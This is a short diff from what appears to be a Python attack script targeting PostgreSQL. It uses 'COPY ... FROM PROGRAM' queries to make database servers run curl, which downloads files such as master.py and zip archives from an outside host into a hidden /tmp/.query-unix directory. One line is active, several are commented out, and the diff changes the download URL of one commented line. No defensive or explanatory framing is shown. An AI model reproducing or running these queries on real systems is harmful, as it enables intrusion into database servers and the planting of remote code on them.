@@ -145,7 +145,7 @@ query = "SELECT * FROM pg_cmd;"
 
 #query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/my_env_b.zip https://sbnke.com/my_env_bf.zip';"
 query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/master.py https://sbnke.com/py/master_b.py';"
-#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/unzip.py https://sbnke.com/my_env_bf.zip';"
+#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/unzip.py https://sbnke.com/py/u';"
 #query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
 
 # query = """
